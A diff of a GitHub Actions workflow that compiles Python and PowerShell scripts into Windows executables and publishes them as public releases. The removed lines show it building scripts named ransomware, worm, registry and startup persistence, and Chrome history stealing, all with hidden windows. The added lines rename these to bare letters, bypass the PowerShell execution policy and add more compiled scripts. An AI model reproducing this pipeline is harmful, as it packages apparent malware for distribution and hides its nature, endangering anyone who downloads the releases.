@@ -1,4 +1,4 @@
-name: Compile Python Executable
+name: Compile Python and PowerShell Executables
 
 on:
   push:
@@ -9,7 +9,7 @@ on:
 
 jobs:
   build-windows:
-    # Crucial: Must use Windows to compile a Windows .exe file
+    # Crucial: Must use Windows to compile Windows .exe files
     runs-on: windows-latest
 
     steps:
@@ -26,47 +26,67 @@ jobs:
 
     # Step 3: Install PyInstaller and any project dependencies
     - name: Install Dependencies
+      shell: powershell
       run: |
         python -m pip install --upgrade pip
         pip install pyinstaller
         if (Test-Path requirements.txt) { pip install -r requirements.txt }
 
-    # Step 4: Compile the Python script into a standalone .exe
-    - name: Build Executable with PyInstaller
+    # Step 4: Compile the Python scripts into standalone .exes
+    - name: Build Executables with PyInstaller
+      shell: powershell
       run: |
-        pyinstaller --onefile --windowed Ransomware/ransomware.py
-        pyinstaller --onefile --windowed Spreading/worm2.py
-        pyinstaller --onefile --windowed Startup/addtoregistrykey.py
-        pyinstaller --onefile --windowed Startup/addtostartup.py
-        pyinstaller --onefile --windowed Stealing/gethistoryChrome.py
-      # Note: 
-      # --onefile packages everything into a single .exe
-      # --windowed hides the console window (remove if it is a CLI app)
+        pyinstaller --onefile --windowed a/a.py
+        pyinstaller --onefile --windowed b/b.py
+        pyinstaller --onefile --windowed c/c.py
+        pyinstaller --onefile --windowed d/d.py
+        pyinstaller --onefile --windowed e/e.py
 
-   # Step 5: Save the compiled files and scripts so you can download them from GitHub
+    # Step 5: Override policy restrictions, install ps2exe, and compile PowerShell scripts
+    - name: Install ps2exe and Build PowerShell EXEs
+      shell: powershell
+      run: |
+        # Override execution policy for this automated process
+        Set-ExecutionPolicy Bypass -Scope Process -Force
+        
+        # Avoid hanging on interactive prompts by trusting PSGallery
+        Set-PSRepository PSGallery -InstallationPolicy Trusted
+        
+        # Install and import ps2exe
+        Install-Module ps2exe -Force -AllowClobber
+        Import-Module ps2exe -Force
+        
+        # Compile your PowerShell scripts into the root folder or a specific directory
+        # (Replace 'script1.ps1' with your actual .ps1 filenames)
+        Invoke-ps2exe .\script1.ps1 .\script1.exe
+        Invoke-ps2exe .\script2.ps1 .\script2.exe
+
+    # Step 6: Save all compiled files so you can download them from GitHub Actions panel
     - name: Upload Build Artifacts
       uses: actions/upload-artifact@v4
       with:
         name: windows-executables-and-scripts
-        # Using a multi-line string to capture both the compiled EXEs and your PowerShell scripts
         path: |
           dist/*.exe
+          *.exe
           **/*.ps1
 
+    # Step 7: Create GitHub Release and attach all compiled EXEs
     - name: Create GitHub Release
       uses: softprops/action-gh-release@v2
       with:
         tag_name: v1.0.${{ github.run_number }}
         name: Release v1.0.${{ github.run_number }}
         body: |
-          Automated build of Python executables and PowerShell scripts.
+          Automated build of Python and PowerShell executables.
           
           **Assets included:**
-          * Compiled Executables (a.exe, b.exe, etc.)
-          * PowerShell automation scripts
+          * Compiled Python Executables (a.exe, b.exe, etc.)
+          * Compiled PowerShell Executables (script1.exe, etc.)
+          * Original PowerShell automation scripts
         draft: false
         prerelease: false
-        # Explicitly telling the release action which files to attach as assets
         files: |
           dist/*.exe
+          *.exe
           **/*.ps1
